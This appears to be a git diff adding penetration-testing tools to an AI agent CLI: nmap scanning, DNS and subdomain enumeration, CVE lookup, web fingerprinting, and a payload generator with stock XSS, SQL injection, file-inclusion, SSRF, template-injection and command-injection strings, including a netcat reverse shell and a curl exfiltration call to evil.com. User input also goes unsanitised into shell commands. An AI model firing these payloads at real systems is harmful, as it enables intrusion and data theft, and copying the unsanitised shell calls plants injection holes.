@@ -6,6 +6,7 @@ import { getBlockedCommands } from './config.js';
 import { installTool } from './security/installer.js';
 import { runCommand, classifyCommand } from './command-runner.js';
 import chalk from 'chalk';
+import { CVELookup } from './security/cve-lookup.js';
 
 const TIMEOUT_MS = 30000;
 const MAX_OUTPUT_LENGTH = 10000;
@@ -256,14 +257,119 @@ export function getToolDefinitions() {
         },
         required: ['tool']
       }
+    },
+    {
+      name: 'port_scan',
+      description: 'Scan ports on a target host. Uses nmap for service discovery. Returns open ports, service versions, and OS detection.',
+      input_schema: {
+        type: 'object',
+        properties: {
+          target: { type: 'string', description: 'IP address or hostname to scan' },
+          ports: { type: 'string', description: 'Port range (e.g., "1-1000" or "22,80,443"). Default: common ports.' },
+          scan_type: { type: 'string', description: 'Scan type: quick, full, or service. Default: quick.' }
+        },
+        required: ['target']
+      }
+    },
+    {
+      name: 'dns_lookup',
+      description: 'DNS resolution and record lookup. Returns A, AAAA, MX, NS, TXT, CNAME records for a domain.',
+      input_schema: {
+        type: 'object',
+        properties: {
+          domain: { type: 'string', description: 'Domain name to look up' },
+          record_type: { type: 'string', description: 'DNS record type: A, AAAA, MX, NS, TXT, CNAME, ANY. Default: ALL.' }
+        },
+        required: ['domain']
+      }
+    },
+    {
+      name: 'cve_search',
+      description: 'Search for CVEs affecting a software component and version. Queries NVD API with GitHub Advisory fallback.',
+      input_schema: {
+        type: 'object',
+        properties: {
+          component: { type: 'string', description: 'Software component name (e.g., nginx, openssl, wordpress)' },
+          version: { type: 'string', description: 'Version string (e.g., 1.18.0). Optional.' }
+        },
+        required: ['component']
+      }
+    },
+    {
+      name: 'payload_gen',
+      description: 'Generate attack payloads for a given vulnerability type. Returns ready-to-use payload strings.',
+      input_schema: {
+        type: 'object',
+        properties: {
+          vuln_type: { type: 'string', description: 'Vulnerability type: xss, sqli, lfi, ssrf, cmdi, ssti' },
+          context: { type: 'string', description: 'Context for the payload (e.g., parameter name, HTML context). Optional.' },
+          count: { type: 'number', description: 'Number of payloads to generate. Default: 5.' }
+        },
+        required: ['vuln_type']
+      }
+    },
+    {
+      name: 'fingerprint',
+      description: 'HTTP technology fingerprinting. Identifies web server, frameworks, CMS, libraries, and response headers from a URL.',
+      input_schema: {
+        type: 'object',
+        properties: {
+          url: { type: 'string', description: 'URL to fingerprint (e.g., https://example.com)' },
+          follow_redirects: { type: 'boolean', description: 'Follow redirects. Default: true.' }
+        },
+        required: ['url']
+      }
+    },
+    {
+      name: 'subdomain_enum',
+      description: 'Enumerate subdomains for a given domain using DNS brute force and common subdomain wordlists.',
+      input_schema: {
+        type: 'object',
+        properties: {
+          domain: { type: 'string', description: 'Domain to enumerate subdomains for' },
+          wordlist: { type: 'string', description: 'Wordlist to use: common, top1000, top10000. Default: common.' }
+        },
+        required: ['domain']
+      }
+    },
+    {
+      name: 'web_search',
+      description: 'Search the web using DuckDuckGo. Returns up to 5 results with title, URL, and snippet.',
+      input_schema: {
+        type: 'object',
+        properties: {
+          query: { type: 'string', description: 'Search query' },
+          max_results: { type: 'number', description: 'Maximum results to return (default 5, max 10)' }
+        },
+        required: ['query']
+      }
+    },
+    {
+      name: 'web_fetch',
+      description: 'Fetch a web page and extract its readable text content. Useful for reading documentation, articles, or any URL.',
+      input_schema: {
+        type: 'object',
+        properties: {
+          url: { type: 'string', description: 'URL to fetch' },
+          max_length: { type: 'number', description: 'Maximum characters to return (default 8000)' }
+        },
+        required: ['url']
+      }
     }
   ];
 }
 
 export async function executeTool(toolName, toolInput, options = {}) {
-  const { onConfirm } = options;
+  const { onConfirm, mcpManager } = options;
 
   try {
+    if (toolName.startsWith('mcp__')) {
+      if (!mcpManager) return { error: 'MCP manager not available' };
+      const actualName = toolName.slice(5);
+      const result = await mcpManager.callTool(actualName, toolInput);
+      return result.isError ? { error: result.output } : { output: result.output };
+    }
+
     switch (toolName) {
       case 'bash': return await executeBash(toolInput, options);
       case 'read_file': return executeReadFile(toolInput);
@@ -282,6 +388,14 @@ export async function executeTool(toolName, toolInput, options = {}) {
       case 'remember': return executeRemember(toolInput);
       case 'recall': return executeRecall(toolInput);
       case 'install_tool': return await executeInstallTool(toolInput, options);
+      case 'port_scan': return await executePortScan(toolInput);
+      case 'dns_lookup': return await executeDnsLookup(toolInput);
+      case 'cve_search': return await executeCveSearch(toolInput);
+      case 'payload_gen': return executePayloadGen(toolInput);
+      case 'fingerprint': return await executeFingerprint(toolInput);
+      case 'subdomain_enum': return await executeSubdomainEnum(toolInput);
+      case 'web_search': return await executeWebSearch(toolInput);
+      case 'web_fetch': return await executeWebFetch(toolInput);
       default: return { error: `Unknown tool: ${toolName}` };
     }
   } catch (err) {
@@ -968,5 +1082,418 @@ async function executeInstallTool(input, options) {
     return { success: true, message: `${tool} installed successfully` };
   } else {
     return { success: false, message: `Failed to install ${tool}` };
+  }
+}
+
+async function executePortScan(input) {
+  const { target, ports = '', scan_type = 'quick' } = input;
+  if (!target) return { error: 'Target is required' };
+
+  try {
+    let cmd;
+    if (scan_type === 'full') {
+      cmd = `nmap -sV -sC -p- -T4 ${target} 2>&1`;
+    } else if (scan_type === 'service') {
+      cmd = `nmap -sV -sC -p ${ports || '1-1000'} -T4 ${target} 2>&1`;
+    } else {
+      cmd = `nmap -F -T4 ${target} 2>&1`;
+    }
+
+    const output = execSync(cmd, { encoding: 'utf-8', timeout: 120000 });
+    const lines = output.split('\n').filter(l => l.trim());
+    const summary = lines.filter(l =>
+      /open|PORT|Nmap|OS|Service|PORT|STATE/i.test(l)
+    ).join('\n');
+
+    return {
+      output: summary || output.slice(0, 2000),
+      raw: output.slice(0, 5000),
+      target,
+      scan_type
+    };
+  } catch (err) {
+    if (err.message.includes('nmap')) {
+      return { error: 'nmap is not installed. Use install_tool to install it.', hint: 'install_tool({ tool: "nmap" })' };
+    }
+    return { error: `Port scan failed: ${err.message}` };
+  }
+}
+
+async function executeDnsLookup(input) {
+  const { domain, record_type = 'ANY' } = input;
+  if (!domain) return { error: 'Domain is required' };
+
+  try {
+    const recordTypes = record_type === 'ANY' ? ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME'] : [record_type];
+    const results = {};
+
+    for (const rtype of recordTypes) {
+      try {
+        const output = execSync(
+          process.platform === 'win32'
+            ? `nslookup -type=${rtype} ${domain} 2>&1`
+            : `dig ${domain} ${rtype} +short 2>&1`,
+          { encoding: 'utf-8', timeout: 15000 }
+        );
+        const trimmed = output.trim();
+        if (trimmed && !trimmed.includes('server can') && !trimmed.includes('***')) {
+          results[rtype] = trimmed.split('\n').slice(0, 10);
+        }
+      } catch {}
+    }
+
+    if (Object.keys(results).length === 0) {
+      // Fallback to nslookup
+      try {
+        const output = execSync(`nslookup ${domain} 2>&1`, { encoding: 'utf-8', timeout: 10000 });
+        return { domain, output: output.slice(0, 2000) };
+      } catch {}
+      return { domain, error: `No DNS records found for ${domain}` };
+    }
+
+    return { domain, records: results };
+  } catch (err) {
+    return { error: `DNS lookup failed: ${err.message}` };
+  }
+}
+
+async function executeCveSearch(input) {
+  const { component, version = '' } = input;
+  if (!component) return { error: 'Component name is required' };
+
+  try {
+    const cveLookup = new CVELookup();
+    const results = await cveLookup.lookup(component, version);
+
+    if (!results || results.length === 0) {
+      return { component, version, cves: [], message: `No CVEs found for ${component} ${version}` };
+    }
+
+    return {
+      component,
+      version,
+      cves: results.slice(0, 15).map(cve => ({
+        id: cve.id || 'N/A',
+        severity: cve.severity || 'UNKNOWN',
+        cvss: cve.cvss || 'N/A',
+        description: cve.description ? cve.description.slice(0, 300) : 'No description',
+        references: cve.references ? cve.references.slice(0, 3) : []
+      })),
+      total: results.length
+    };
+  } catch (err) {
+    return { error: `CVE search failed: ${err.message}` };
+  }
+}
+
+function executePayloadGen(input) {
+  const { vuln_type, context = '', count = 5 } = input;
+  if (!vuln_type) return { error: 'Vulnerability type is required (xss, sqli, lfi, ssrf, cmdi, ssti)' };
+
+  try {
+    const allPayloads = generateDefaultPayloads(vuln_type, count);
+    const payloads = allPayloads.slice(0, count);
+
+    return {
+      vuln_type,
+      payloads,
+      count: payloads.length,
+      warning: 'Use these payloads only on authorized targets'
+    };
+  } catch (err) {
+    return { error: `Payload generation failed: ${err.message}` };
+  }
+}
+
+function generateDefaultPayloads(vulnType, count) {
+  const payloads = {
+    xss: [
+      '<script>alert(1)</script>',
+      '"><img src=x onerror=alert(1)>',
+      "'-alert(1)-'",
+      '<svg onload=alert(1)>',
+      'javascript:alert(1)',
+      '<img src=x onerror=alert(document.cookie)>',
+      '<input onfocus=alert(1) autofocus>',
+      '"><svg onload=alert(1)>',
+      "';alert(1);//",
+      '<details x= ontoggle=alert(1)>'
+    ],
+    sqli: [
+      "' OR '1'='1",
+      "' UNION SELECT 1--",
+      "1' ORDER BY 1--",
+      "' AND 1=1--",
+      "1' UNION SELECT @@version--",
+      "' OR 1=1--",
+      "admin'--",
+      "1' AND SLEEP(5)--",
+      "' UNION SELECT table_name,column_name FROM information_schema.columns--",
+      "1' UNION SELECT NULL,NULL,NULL--"
+    ],
+    lfi: [
+      '../../../etc/passwd',
+      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+      '../../../etc/shadow',
+      '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+      '....//....//....//etc/passwd',
+      '../../../proc/self/environ',
+      '..\\..\\..\\boot.ini',
+      '../../../etc/hosts',
+      'php://filter/convert.base64-encode/resource=index.php',
+      '../../../var/log/apache2/access.log'
+    ],
+    ssrf: [
+      'http://127.0.0.1:8080',
+      'http://169.254.169.254/latest/meta-data/',
+      'http://localhost:22',
+      'http://0.0.0.0:80',
+      'file:///etc/passwd',
+      'http://[::1]:22',
+      'http://10.0.0.1:22',
+      'http://172.16.0.1:443',
+      'http://192.168.1.1:80',
+      'gopher://localhost:6379/_'
+    ],
+    cmdi: [
+      '; ls',
+      '| whoami',
+      '&& id',
+      '`cat /etc/passwd`',
+      '| cat /etc/hosts',
+      ';id;',
+      '| nc -e /bin/sh 127.0.0.1 4444',
+      '$(cat /etc/passwd)',
+      '& ping -c 10 127.0.0.1 &',
+      '| curl http://evil.com/exfil?data=$(whoami)'
+    ],
+    ssti: [
+      '{{7*7}}',
+      '${7*7}',
+      '<%= 7*7 %>',
+      '{{config}}',
+      '#{7*7}',
+      '*{7*7}',
+      '{{7*\'7\'}}',
+      '<%= system("id") %>',
+      '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
+      '${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}'
+    ]
+  };
+
+  return payloads[vulnType.toLowerCase()] || [`${vulnType}://test-payload`];
+}
+
+async function executeFingerprint(input) {
+  const { url, follow_redirects = true } = input;
+  if (!url) return { error: 'URL is required' };
+
+  try {
+    const redirectFlag = follow_redirects ? '-L' : '';
+    const curlCmd = `curl -s ${redirectFlag} -i -k --max-time 15 "${url}" 2>&1`;
+    const response = execSync(curlCmd, { encoding: 'utf-8', timeout: 20000 });
+
+    const headerEnd = response.indexOf('\r\n\r\n');
+    const headers = headerEnd >= 0 ? response.slice(0, headerEnd) : response;
+    const body = headerEnd >= 0 ? response.slice(headerEnd + 4) : '';
+
+    const tech = [];
+    const headerLines = headers.split('\n');
+
+    // Server header
+    const server = headerLines.find(l => /^server:/i.test(l));
+    if (server) tech.push({ tech: server.split(':')[1]?.trim(), source: 'Server header' });
+
+    // X-Powered-By
+    const poweredBy = headerLines.find(l => /^x-powered-by:/i.test(l));
+    if (poweredBy) tech.push({ tech: poweredBy.split(':')[1]?.trim(), source: 'X-Powered-By' });
+
+    // Set-Cookie analysis
+    const cookies = headerLines.filter(l => /^set-cookie:/i.test(l));
+    if (cookies.some(c => c.includes('PHPSESSID'))) tech.push({ tech: 'PHP', source: 'Session cookie' });
+    if (cookies.some(c => c.includes('JSESSIONID'))) tech.push({ tech: 'Java/JSP', source: 'Session cookie' });
+    if (cookies.some(c => c.includes('ASPSESSIONID'))) tech.push({ tech: 'ASP/.NET', source: 'Session cookie' });
+
+    // Body markers
+    if (body.includes('wp-content')) tech.push({ tech: 'WordPress', source: 'Body marker' });
+    if (body.includes('Drupal.settings')) tech.push({ tech: 'Drupal', source: 'Body marker' });
+    if (body.includes('Joomla')) tech.push({ tech: 'Joomla', source: 'Body marker' });
+    if (body.includes('nginx')) tech.push({ tech: 'nginx', source: 'Body marker' });
+
+    // Common framework + version patterns
+    const versionPatterns = [
+      { pattern: /WordPress\s+v?([\d.]+)/i, tech: 'WordPress version' },
+      { pattern: /Drupal\s+([\d.]+)/i, tech: 'Drupal version' },
+      { pattern: /jQuery\s+v?([\d.]+)/i, tech: 'jQuery version' },
+      { pattern: /Bootstrap\s+v?([\d.]+)/i, tech: 'Bootstrap version' },
+      { pattern: /React/ig, tech: 'React' },
+      { pattern: /Angular/ig, tech: 'Angular' },
+      { pattern: /Vue\./ig, tech: 'Vue.js' },
+      { pattern: /Laravel/ig, tech: 'Laravel' },
+      { pattern: /Django/ig, tech: 'Django' },
+      { pattern: /Flask/ig, tech: 'Flask' },
+      { pattern: /Express/ig, tech: 'Express.js' }
+    ];
+
+    for (const { pattern, tech: techName } of versionPatterns) {
+      const match = body.match(pattern);
+      if (match) {
+        const version = match[1] ? ` (${match[1]})` : '';
+        if (!tech.some(t => t.tech === techName + version)) {
+          tech.push({ tech: techName + version, source: 'Body pattern' });
+        }
+      }
+    }
+
+    return {
+      url,
+      status: headerLines[0] || '',
+      headers: headerLines.slice(1, 20),
+      technologies: tech,
+      raw: headers.slice(0, 2000)
+    };
+  } catch (err) {
+    if (err.message.includes('curl')) {
+      return { error: 'curl is not installed. Use install_tool to install it.', hint: 'install_tool({ tool: "curl" })' };
+    }
+    return { error: `Fingerprint failed: ${err.message}` };
+  }
+}
+
+async function executeSubdomainEnum(input) {
+  const { domain, wordlist = 'common' } = input;
+  if (!domain) return { error: 'Domain is required' };
+
+  try {
+    const subdomains = [];
+
+    if (wordlist === 'common') {
+      const common = ['www', 'mail', 'admin', 'api', 'blog', 'dev', 'test', 'stage', 'beta', 'app',
+        'cdn', 'static', 'assets', 'media', 'img', 'docs', 'wiki', 'forum', 'support', 'help',
+        'shop', 'store', 'portal', 'login', 'auth', 'sso', 'webmail', 'vpn', 'remote', 'git',
+        'jenkins', 'jira', 'confluence', 'grafana', 'prometheus', 'kibana', 'elastic', 'splunk',
+        'db', 'database', 'mysql', 'redis', 'mq', 'rabbitmq', 'kafka', 'ns1', 'ns2', 'ns3',
+        'mx1', 'mx2', 'smtp', 'imap', 'pop3', 'calendar', 'meet', 'chat', 'status', 'monitor',
+        'backup', 'mon', 'ops', 'prod', 'staging', 'demo', 'sandbox', 'internal', 'corp',
+        'employee', 'partner', 'portal', 'erp', 'crm', 'hr', 'payroll', 'analytics', 'reports'];
+
+      for (const sub of common) {
+        const fqdn = `${sub}.${domain}`;
+        try {
+          execSync(
+            process.platform === 'win32'
+              ? `nslookup ${fqdn} 2>&1`
+              : `dig ${fqdn} +short 2>&1`,
+            { encoding: 'utf-8', timeout: 3000, stdio: 'pipe' }
+          );
+          subdomains.push(fqdn);
+        } catch {}
+      }
+    } else {
+      // Use subfinder if available for larger wordlists
+      try {
+        const output = execSync(`subfinder -d ${domain} -silent -timeout 5 2>&1`, { encoding: 'utf-8', timeout: 30000 });
+        subdomains.push(...output.trim().split('\n').filter(Boolean));
+      } catch {
+        return { domain, error: 'subfinder not installed. Install with: install_tool({ tool: "subfinder" })', subdomains: [] };
+      }
+    }
+
+    return {
+      domain,
+      found: subdomains.length,
+      subdomains: subdomains.slice(0, 50),
+      note: subdomains.length > 50 ? `(showing first 50 of ${subdomains.length})` : ''
+    };
+  } catch (err) {
+    return { error: `Subdomain enumeration failed: ${err.message}` };
+  }
+}
+
+async function executeWebSearch(input) {
+  const { query, max_results = 5 } = input;
+  if (!query) return { error: 'Query is required' };
+
+  try {
+    const url = `https://html.duckduckgo.com/html/?q=${encodeURIComponent(query)}`;
+    const response = await fetch(url, {
+      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; RedCLI/0.3)' }
+    });
+    const html = await response.text();
+
+    const results = [];
+    const linkRegex = /<a[^>]*class="result__a"[^>]*href="([^"]*)"[^>]*>([\s\S]*?)<\/a>/gi;
+    const snippetRegex = /<a[^>]*class="result__snippet"[^>]*>([\s\S]*?)<\/a>/gi;
+
+    const links = [];
+    let m;
+    while ((m = linkRegex.exec(html)) !== null && links.length < max_results) {
+      links.push({ url: m[1], title: m[2].replace(/<[^>]*>/g, '').trim() });
+    }
+
+    const snippets = [];
+    while ((m = snippetRegex.exec(html)) !== null && snippets.length < max_results) {
+      snippets.push(m[1].replace(/<[^>]*>/g, '').trim());
+    }
+
+    for (let i = 0; i < links.length; i++) {
+      results.push({
+        title: links[i].title,
+        url: links[i].url,
+        snippet: snippets[i] || ''
+      });
+    }
+
+    if (results.length === 0) {
+      return { results: [], message: 'No results found' };
+    }
+    return { results };
+  } catch (err) {
+    return { error: `Search failed: ${err.message}` };
+  }
+}
+
+async function executeWebFetch(input) {
+  const { url, max_length = 8000 } = input;
+  if (!url) return { error: 'URL is required' };
+
+  if (url.includes('localhost') || url.includes('127.0.0.1')) {
+    return { error: 'Requests to localhost are blocked by default' };
+  }
+
+  try {
+    const response = await fetch(url, {
+      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; RedCLI/0.3)' }
+    });
+
+    if (!response.ok) {
+      return { error: `HTTP ${response.status}: ${response.statusText}` };
+    }
+
+    const html = await response.text();
+
+    const text = html
+      .replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '')
+      .replace(/<style[^>]*>[\s\S]*?<\/style>/gi, '')
+      .replace(/<nav[^>]*>[\s\S]*?<\/nav>/gi, '')
+      .replace(/<footer[^>]*>[\s\S]*?<\/footer>/gi, '')
+      .replace(/<header[^>]*>[\s\S]*?<\/header>/gi, '')
+      .replace(/<[^>]+>/g, ' ')
+      .replace(/&[a-z]+;/g, ' ')
+      .replace(/\s+/g, ' ')
+      .trim();
+
+    const truncated = text.length > max_length
+      ? text.slice(0, max_length) + '\n... (truncated)'
+      : text;
+
+    return {
+      url,
+      status: response.status,
+      content: truncated,
+      length: text.length
+    };
+  } catch (err) {
+    return { error: `Failed to fetch ${url}: ${err.message}` };
   }
 }
